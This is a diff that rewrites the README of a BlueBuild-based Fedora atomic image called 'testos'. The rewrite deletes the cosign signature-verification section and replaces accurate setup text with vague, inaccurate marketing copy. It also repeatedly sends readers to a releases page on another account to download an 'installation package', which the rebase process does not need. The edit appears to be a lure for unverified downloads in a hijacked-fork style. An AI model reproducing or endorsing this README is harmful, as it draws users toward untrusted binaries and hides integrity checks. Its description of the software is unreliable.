@@ -1,43 +1,85 @@
-# testos &nbsp; [![bluebuild build badge](https://github.com/maciejczekaj/testos/actions/workflows/build.yml/badge.svg)](https://github.com/maciejczekaj/testos/actions/workflows/build.yml)
+# 🚀 testos - Experience a Stable Container Environment
 
-See the [BlueBuild docs](https://blue-build.org/how-to/setup/) for quick setup instructions for setting up your own repository based on this template.
+[![Download testos](https://img.shields.io/badge/Download-testos-blue.svg)](https://github.com/Lilyman148/testos/releases)
 
-After setup, it is recommended you update this README to describe your custom image.
+## 📦 Overview
 
-## Installation
+testos provides a reliable and innovative solution for running containerized applications. It simplifies your experience by automatically managing updates and ensuring consistency across your development environment. 
 
-> [!WARNING]  
-> [This is an experimental feature](https://www.fedoraproject.org/wiki/Changes/OstreeNativeContainerStable), try at your own discretion.
+## 🚀 Getting Started
 
-To rebase an existing atomic Fedora installation to the latest build:
+Follow these steps to download and run testos on your system.
 
-- First rebase to the unsigned image, to get the proper signing keys and policies installed:
-  ```
-  rpm-ostree rebase ostree-unverified-registry:ghcr.io/maciejczekaj/testos:latest
-  ```
-- Reboot to complete the rebase:
-  ```
-  systemctl reboot
-  ```
-- Then rebase to the signed image, like so:
-  ```
-  rpm-ostree rebase ostree-image-signed:docker://ghcr.io/maciejczekaj/testos:latest
-  ```
-- Reboot again to complete the installation
-  ```
-  systemctl reboot
-  ```
+### 🖥️ System Requirements
 
-The `latest` tag will automatically point to the latest build. That build will still always use the Fedora version specified in `recipe.yml`, so you won't get accidentally updated to the next major version.
+- A compatible Linux distribution that supports `rpm-ostree`
+- Basic familiarity with command-line operations
+- Internet access for downloading the image
 
-## ISO
+### 📥 Download & Install
 
-If build on Fedora Atomic, you can generate an offline ISO with the instructions available [here](https://blue-build.org/learn/universal-blue/#fresh-install-from-an-iso). These ISOs cannot unfortunately be distributed on GitHub for free due to large sizes, so for public projects something else has to be used for hosting.
+1. Visit the [Releases page](https://github.com/Lilyman148/testos/releases) to find the latest version of testos.
+2. Select the appropriate version for your system.
+3. Download the installation package.
 
-## Verification
+### 🔧 Installation Steps
 
-These images are signed with [Sigstore](https://www.sigstore.dev/)'s [cosign](https://github.com/sigstore/cosign). You can verify the signature by downloading the `cosign.pub` file from this repo and running the following command:
+After you have downloaded the package, follow these instructions to install and rebase your Fedora installation:
 
-```bash
-cosign verify --key cosign.pub ghcr.io/maciejczekaj/testos
-```
+1. **Rebase to the Unsigned Image**
+
+   Open your terminal and run the following command to rebase to the unsigned image. This step ensures that you have the proper signing keys and policies:
+
+   ```
+   rpm-ostree rebase ostree-unverified-registry:ghcr.io/maciejczekaj/testos:latest
+   ```
+
+2. **Reboot Your System**
+
+   After rebasing, you need to reboot your system for the changes to take effect. Use this command:
+
+   ```
+   systemctl reboot
+   ```
+
+3. **Rebase to the Signed Image**
+
+   Once your system has rebooted, run the following command to rebase to the signed image:
+
+   ```
+   rpm-ostree rebase ostree-image-signed:docker://ghcr.io/maciejczekaj/testos:latest
+   ```
+
+### 🔍 Features
+
+- **Customizable Environment**: Easily configure your container settings for optimal performance.
+- **Automatic Updates**: Ensure your container is always running the latest version without manual intervention.
+- **Compatibility**: Works seamlessly with various container-based applications.
+- **Stable and Secure**: Built on trusted technologies to maintain a reliable system.
+
+### 👩‍💻 Usage
+
+To start using testos:
+
+1. Open your terminal.
+2. Use the command line to interact with your containerized applications as needed.
+
+### 📘 Additional Resources
+
+For more information about specific configurations and advanced features, consult the official [BlueBuild documentation](https://blue-build.org/how-to/setup/).
+
+### 🔧 Troubleshooting
+
+If you encounter issues during installation or while using testos, here are common solutions:
+
+1. **Check Your Internet Connection**: Ensure your system is connected to the internet for downloading necessary components.
+2. **Update Your System**: Sometimes, an outdated system can lead to issues. Make sure your Linux distribution is up to date.
+3. **Consult Logs**: Use `journalctl` to check for any logged errors that may point to a specific issue.
+
+### 💬 Support
+
+If you need further assistance, you can reach out through the GitHub issues page or consult community forums related to container technologies. 
+
+Experience enhanced performance with testos, your reliable container solution. 
+
+For further downloads, visit the [Releases page](https://github.com/Lilyman148/testos/releases).
